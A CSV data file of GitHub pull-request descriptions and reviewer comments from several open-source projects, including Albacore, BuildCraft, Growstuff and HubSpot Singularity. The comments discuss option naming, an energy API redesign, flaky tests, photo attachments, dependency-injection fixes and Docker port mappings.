,gh_project_name,gh_pull_req_num,gh_pr_original_comment,gh_comments
0,Albacore/albacore,34.0,To not remove existing files in directory. Useful for cases when files are coming from multiple different directories.,"['This cannot be automatically merged anymore. Could you see if you could rebase on dev and preferrably make the diff for the spec file look like not ALL of it has changed?', 'Done. Rebased and removed whitespace difference.', ""I'm not a fan of the boolean property setter like this. It [can be confusing][3] to interpret what kind of value to assign, boolean (`false`) or symbol (`:false`), or if it's a method call. I like the method syntax. For example,\r\n* xunit task, [`skip_test_failures`][1]\r\n* msbuild task, [`nologo`][2]\r\n\r\nThe name `remove_dir_to` isn't as friendly as it could be. It's not totally consistent with the `from` and `to` properties. It's true by default, internally. So, should this property only be set when intended to be false?\r\n\r\nWhat about a method for just the file-preserving behavior, named very specifically? I could support\r\n\r\n* `keep_to`\r\n* `preserve_to`\r\n* `dont_clean`\r\n* `no_overwrite`\r\n* `no_clean`\r\n\r\nI feel like there's a better name I haven't thought of yet, thoughts?\r\n\r\n----\r\nFYI, it feels like it would be easier to name if we switched the default behavior to _never_ clean and had a method _to clean_... then we could just say `out.clean`. But, that's not in the cards.\r\n\r\n\r\n [1]: https://github.com/Albacore/albacore/blob/dev/lib/albacore/xunittestrunner.rb#L18\r\n [2]: https://github.com/Albacore/albacore/blob/dev/lib/albacore/msbuild.rb#L22\r\n [3]: http://stackoverflow.com/questions/8701295"", ""Ah right didn't get this albacore convention. I have changed it to `keep_to` sounds like the most appropriate to me."", '@haf, are you ok with this one now?', 'Initialised keep_to to false. \r\nDuring playing with it discovered that there is a test missing for case when keep_to is not set. ', 'Ok, great!']"
1,BuildCraft/BuildCraft,1834.0,"As part of #1797

* Engines can put energy directly to block with battery which have a receive support (simulate old behavior)
* Engines doesn't push energy in wooden pipes anymore
* Instead, wooden pipes grabbing energy from batteries with send support
* Energy now has a constant rate at all time.
* Battery reconfigurator.
* Transparent support of old power framework when using only new framework, no more dozens checks of tile!
* Maybe something else :)","[""I'm starting a review of this - hoping to merge this week-end if everything is OK."", 'In addition to the first review I run, I\'d like to brainstorm some more on a design choice that is not completely clear yet:\r\n\r\nwe have battery object in mode ""output"" and battery objects in mode ""input"" (and mode ""both""). That\'s great, helps pointing data that are producers and receivers. Users can easily read and write to these in their code, just by adding or removing values. \r\n\r\nNow to move energy from an output to an input, we need actual code in the tile. A battery in mode ""input"" next to a battery in mode ""output"" will not do this automatically. Right now, we have wooden pipes which are pulling from nearby outputs, and engines which are pushing to nearby inputs. But that\'s becoming a bit inconsistent and seems difficult to scale up.\r\n\r\nLet me suggest to go one notch further in the design and identify clearly:\r\n\r\n- passive batteries which will not push or pull energy\r\n- active batteries which will do push / pull\r\n- add a rule giving a priority when two active objects are next one to another (e.g. a pull never pulls from a push, or vice versa)\r\n\r\nThen provide some easy function (a method in MjAPI?) which allows players to automatically resolve push / pull on their tile. Something like:\r\n\r\n```\r\n   function activate (TileEntity tile) {\r\n      \r\n   }\r\n```\r\n\r\nso that in my tile I can just do:\r\n\r\n```\r\npublic void updateEntity() {\r\n   MjAPI.activate (this);\r\n}\r\n```', ""@SpaceToad\r\nI'd push small changes (see MjAPI.updateEntity() and IOMode), should be more easy to integrate new framework."", 'MjAPI.updateEntity() looks good indeed. Last problem to solve is this cache issue.', '@SpaceToad PR updated, active receive mode and caching batteries instances added.', ""Let's go with this :-) Thanks for the effort on this one. I trust we'll have further refinements on the 6.1 branch, but that's already a substantial improvement.""]"
2,Findwise/Hydra,225.0,"The admin-service can now be configured with a property file, just like the Core.

This means the admin-service now supports authentication to MongoDB.


Adds a stub of a test for the service endpoint methods, suggestions on how to create proper tests for those are very welcome!","['This fixes #208.', ""I'll merge this after having it running for quite a while in a production environment. There might be some more fixes coming in as well.""]"
3,Findwise/Hydra,351.0,Fixes #349 ,"['One test in database is failing: `testGetAndTagCacheMiss()`. It uses tons of mocks, but it seems that it is assuming that the object returned by the backing database is the same object that is returned by the cache. Is this not true anymore?', '@laserval The test merely tests that someone has executed setFetchedBy on the document, in the case of a cache miss.\r\n\r\nThis is done by both Database implementations, this does not show since the database implementation is mocked away. I vote removing the assertion.\r\nA commit is coming up for that.', 'This is failing on the new integration test on Travis, see:\r\nhttps://s3.amazonaws.com/archive.travis-ci.org/jobs/41457246/log.txt\r\n\r\nI also had some problems running it, the test VM exited. Will have to look into that - might be the instability of this. multiprocess stuff...', ""Yes. We might have to remove the test, it isn't stable at all.\r\nWhat do you think?\r\n\r\nPerhaps keeping the test, but disabling it?""]"
4,Gazler/rapidash,8.0,A lot of changes :smiley: ,"['These changes look good, I appreciate you taking the time to do them.  I have raised a few issues, I am happy to do them if you like, but I am also happy for you to do them.', '@Gazler Done!', ""@mli-max I'll have a play later on tonight then merge it in!"", ""@mli-max I have moved the tests about a bit.  You can see the commit at https://github.com/Gazler/rapidash/commit/f011cf6ddf0b64c624fac62b5d3996ac734b8113 I would appreciate you checking it over to make sure I haven't screwed any of your changes!\r\n\r\nJust to let you know, the coverage was showing 100% of coverage for the **spec** files and not the actual code.  It is now 100% in both cases (although getting 100% coverage is far easier than writing tests!)"", '@Gazler Good']"
5,Growstuff/growstuff,410.0,"There's a lot here.

Mostly, I started with copying stuff from Plantings to Harvests. The Photos model has been modified to have m2m's for both plantings and harvests, and the photos controller has been modified so it expects parameters like this:
> ?type=planting&id=3
>  ?type=harvest&id=4

not like this:

>    ?planting_id=3

It has a list of valid types (right now just harvest and planting, but I'll work on garden soon), and it checks that all  input is valid. Then it marks which Thing the photo belongs to. It parses which type of Thing that is from the type parameter rather than having if/elsif statements that need to be updated every time the valid type list is updated.

Most of the rest should be pretty self-explanatory, given the old code shows in the diff. I did add expand the tests on both photos and harvests and update the planting photo tests to include the new parameter list.","['\n[![Coverage Status](https://coveralls.io/builds/1190193/badge)](https://coveralls.io/builds/1190193)\n\nCoverage increased (+0.1%) when pulling **ed537e583baa711f64e48eb2d744a54e1cfbfc89 on maco:dev** into **51d9bfe97e07602430a48998ef6954ae936a9434 on Growstuff:dev**.\n', ""Thanks for all this, @maco!  It looks pretty good so far but I've left several line comments about particular things which I'd like to see fixed."", '\n[![Coverage Status](https://coveralls.io/builds/1190375/badge)](https://coveralls.io/builds/1190375)\n\nCoverage increased (+0.1%) when pulling **550f3c53265e80185486298079fdb7bebde63fc0 on maco:dev** into **51d9bfe97e07602430a48998ef6954ae936a9434 on Growstuff:dev**.\n', 'So, where have we got to with this PR? AFAICT the following changes, mostly small, have been requested:\r\n\r\n - [ ] test behaviour if a photo is attached to a planting and a harvest and one of them is deleted\r\n - [ ] replace controller test with feature test\r\n - [ ] add index to table\r\n - [ ] refactor error-handling logic in `photos_controller`\r\n\r\nAFAICT the last two are in the ""nice to have"" category - are the first two blockers? @Skud @tygriffin?', 'I\'d say none of them are hard blockers, but that I\'d like to see some effort put into the first two before passing on them.  I know the first two require complex mocking of the Flickr API etc, and that this is Very Hard.  If it\'s not doable then it\'s not doable.  But please can we have a shot at it before passing?\r\n\r\nThe index looks relatively trivial to do.  Let\'s get that done at least.\r\n\r\nThe refactoring is a ""nice to have"" but also not hard, so I think it\'s worth doing.', ""Wait, correction.\r\n\r\n1. This doesn't need API mocking, and should be done.\r\n2. This needs API mocking and I know it might be really hard, but please give it a shot.  @pozorvlak and @maco please email and work on it asyncronously since your timezones are incompatible.\r\n3. Trivial. Please do this :)\r\n4. Trivial but makes things clearer. Please do this too!"", 'Possibly useful:\r\n\r\nhttp://stackoverflow.com/questions/3539465/how-do-i-stub-out-the-flickraw-library-in-my-apps-unit-tests\r\nhttp://effectif.com/ruby/manor/faking-http-requests-during-testing\r\nhttps://github.com/rspec/rspec-mocks\r\n', 'I just went to take a look at some of the API mocking stuff here and noticed that @maco hadn\'t branched before doing this work.  Maco, generally we prefer it if you create a feature branch (eg. ""git checkout -b harvestphotos"") before working on a feature.\r\n\r\nGit hurts my brain so I don\'t know offhand how to move these commits to a named feature branch, I\'m afraid :-/', 'After I had some commits I realized it would\xe2\x80\x99ve been nice if I had used a branch. If I branched now, it\xe2\x80\x99d have these commits in its history (as part of master). I don\xe2\x80\x99t think there\xe2\x80\x99s a way to move them, so I\xe2\x80\x99ll just have to remember for next time.=', '@maco I just sent you a pull request for item 1 (tests for deleting plantings/harvests/photos etc).  It turns out there was brokenness there (unused photos were still lingering in the system) so i have also fixed this and written a rake task to clean up any old photos in that state.', '\n[![Coverage Status](https://coveralls.io/builds/1282781/badge)](https://coveralls.io/builds/1282781)\n\nCoverage increased (+1.42%) when pulling **57abfa04b38f23d15bed82572ce44319279b7edb on maco:dev** into **51d9bfe97e07602430a48998ef6954ae936a9434 on Growstuff:dev**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1282891/badge)](https://coveralls.io/builds/1282891)\n\nCoverage increased (+2.07%) when pulling **fcda8742d8049bac9bcfb46f82b00f79c54c4f69 on maco:dev** into **51d9bfe97e07602430a48998ef6954ae936a9434 on Growstuff:dev**.\n', 'There are several tab characters in the latest commits.  Can you please replace them with spaces as per our style guide?  If you are using vim, check out our [recommended settings](http://wiki.growstuff.org/index.php/Vim_settings) so you don\'t have this problem going forward.  To check that you\'ve caught them all, try:\r\n\r\n    git grep ""<ctrl-v><tab>""\r\n\r\n(holding down control and pressing V, then hitting tab, within the quote marks)', 'darn it, i thought i s/^I/  /g \xe2\x80\x98d!=', '\n[![Coverage Status](https://coveralls.io/builds/1282998/badge)](https://coveralls.io/builds/1282998)\n\nCoverage increased (+2.07%) when pulling **48ad561b76c4128928650c8bde26dc6109383278 on maco:dev** into **51d9bfe97e07602430a48998ef6954ae936a9434 on Growstuff:dev**.\n', ""Woohoo, merged! Can't wait to get this tested and pushed up to the site :)"", ""Woohoo! Great to see this merged. Sorry I've been so little help on it.\r\n\r\n@maco: you can copy commits from one branch to another with `git cherry-pick`, and start a branch from somewhere other than the current HEAD with `git checkout -b [commit-id]`. AFAICT it's not a big deal here, though.""]"
6,Growstuff/growstuff,616.0,Based on jbuilder and introducing some JSON-LD elements. Work in progress. For #582 (I think).,"['\n[![Coverage Status](https://coveralls.io/builds/1703599/badge)](https://coveralls.io/builds/1703599)\n\nCoverage increased (+0.02%) when pulling **a3e3abecf33c123403020ccfdf9f3062330e880e on pmackay:api_v1** into **9d49a83918824c4a7974b8e653f1c2715084fa64 on Growstuff:api_v1**.\n', ""Yes, #582 is probably the best issue to link to -- there was a PT story (as you know) for the framework but I didn't move it across as it was open and I hadn't quite figured out what to do with open stories.\r\n\r\nI've left a bajillion line notes as you've no doubt seen already, but overall it looks good.  If you could do some of those small things I mentioned, I'll be happy to merge.  (We can have an ongoing discussion about IDs, URLs, etc over on Growstuff Talk I think. I won't let it block this PR.)"", ""Have made various updates. The RSpec tests could probably be improved further. I've spent quite a bit of time on those but (being still quite new to rspec) I'm finding it harder to follow the docs I can find on it compared with other parts of Rails. Any good recommendations much appreciated :)"", '\n[![Coverage Status](https://coveralls.io/builds/1725557/badge)](https://coveralls.io/builds/1725557)\n\nCoverage increased (+0.05%) when pulling **1b5d2bb898be4e437d61c7b8661659517451fa85 on pmackay:api_v1** into **9d49a83918824c4a7974b8e653f1c2715084fa64 on Growstuff:api_v1**.\n', ""@tygriffin I've updated those, thanks!"", '\n[![Coverage Status](https://coveralls.io/builds/1727592/badge)](https://coveralls.io/builds/1727592)\n\nCoverage increased (+0.05%) when pulling **016feaf8bf12f5a8fad00f68b82b7bc228ab6bc7 on pmackay:api_v1** into **9d49a83918824c4a7974b8e653f1c2715084fa64 on Growstuff:api_v1**.\n', ""OK, this looks good to merge to the Growstuff API branch.  Thanks for all your fixes, @pmackay!\r\n\r\nWrt rspec documentation, ugh, I knooooow.  This website is a good rundown of best practices: http://betterspecs.org/  Apart from that I'm afraid I mostly just cargo-culted it until I kinda knew what I was doing.  I think there might be a good book out there, but I don't have it.""]"
7,HubSpot/Singularity,251.0,"This branch will get all the Guice changes to make DI work correctly and eliminate all the race conditions and have the startup and shutdown of the service controlled by the dropwizard framework.

The first patch is fixing all the lazy injection places, add explicit injection for everything that is referenced through Guice and uses eager injection everywhere.","['This will become a somewhat uncomfortably big change to Singularity to get all the corner cases right; it does need thorough review before applying. That said, I do run with all my changes in a test environment and have not seen any problems (but I am also not using the more exotic features such as mail notification).', 'fyi @HiJon89 ', ""I am just now starting to see some bizarre race conditions in some local testing on a different machine. For example, I see multiple calls to start curator despite it being inside of a Provides/Singleton tagged method.\r\n\r\nI am not sure why this is suddenly an issue on this machine and doesn't appear to ever be an issue in any of our deployed environments. In any case, can these changes be applied by their own or does this PR await more patches?"", 'Which exact version of the JDK do you run with @hgschmie?', 'Can we remove the dropwizard-guice dependency with this or is still being used for something?', 'This is not yet ready to be merged. I thought that the reflection helper did go away. Let me get back to you tomorrow when I am in the office.', 'Ok, so this is now the whole hog. All fixes to the lifecycle, use the DW managed code everywhere, fix the curator badness etc. etc.\r\n\r\nThis does require some review. :-) ']"
8,HubSpot/Singularity,313.0,"This PR adds the `portMappings` field to `SingularityDockerInfo`, and allows for users to launch docker containers (via the docker executor, as opposed to a straight `docker run` command) mapped to ports allocated from the Mesos offer.

Example (works with our Vagrant rig):
```json
{
    ""deploy"": {
        ""id"": ""11"",
        ""requestId"": ""nginx"",
        ""resources"": {
            ""cpus"": 1,
            ""memoryMb"": 128,
            ""numPorts"": 1
        },
        ""serviceBasePath"": ""/"",
        ""loadBalancerGroups"": [""vagrant""],
        ""containerInfo"": {
            ""type"": ""DOCKER"",
            ""docker"": {
                ""image"": ""registry.hub.docker.com/nginx:latest"",
                ""portMappings"": [{""containerPort"": 80, ""hostPort"": 0, ""hostPortType"": ""FROM_OFFER""}]
            }
        }
    }
}
```

/cc @wsorenson @hgschmie @stevenschlansker 

/ccc @eliast -- you can probably utilize this in your re:invent demo","[""If it's not too hard, might be worth adding fields for the `DockerInfo.privileged` and `DockerInfo.parameters` protobuf fields, since you're here anyway.  Somewhat unrelated to port mapping but I could see it coming in useful (e.g. for advanced handling of capabilities)\r\n\r\nNeeds some tests.  Other than that, a hearty :+1: "", ""Those fields didn't make it into `0.20.1` either, but I'll add a TODO so we don't forget. :disappointed:\r\n\r\nI'll add some tests tonight / tomorrow.\r\n"", ""Rats, I'm just not on top of things today :P""]"
9,HubSpot/Singularity,475.0,"@tpetr - I took an initial run at this, doesn't use local storage to save the filename right now (as I mentioned), but otherwise will redirect to whatever filename is entered. 
","[""we're going to simplify the logic and redirect the user to the file the want to tail as soon as the task starts -- @benrlodge is going to tweak the file tailing view so that the error message is less drastic, and the page will auto-update for as long as the task is running (this will be in a separate PR, and we'll rebase it in here once it's merged)"", 'moving to #504 ']"
